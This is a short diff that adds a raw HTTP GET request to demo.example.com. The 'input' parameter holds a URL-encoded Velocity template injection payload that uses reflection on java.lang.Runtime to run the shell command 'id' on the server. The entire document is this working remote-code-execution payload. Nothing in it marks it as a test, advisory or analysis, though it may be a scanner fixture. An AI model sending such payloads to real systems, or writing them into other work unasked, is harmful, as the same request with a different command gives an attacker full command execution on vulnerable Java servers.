@@ -1,0 +1,4 @@
+GET /a?input=%23set%28%24x%3D%22%22%29%24x.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22id%22%29 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
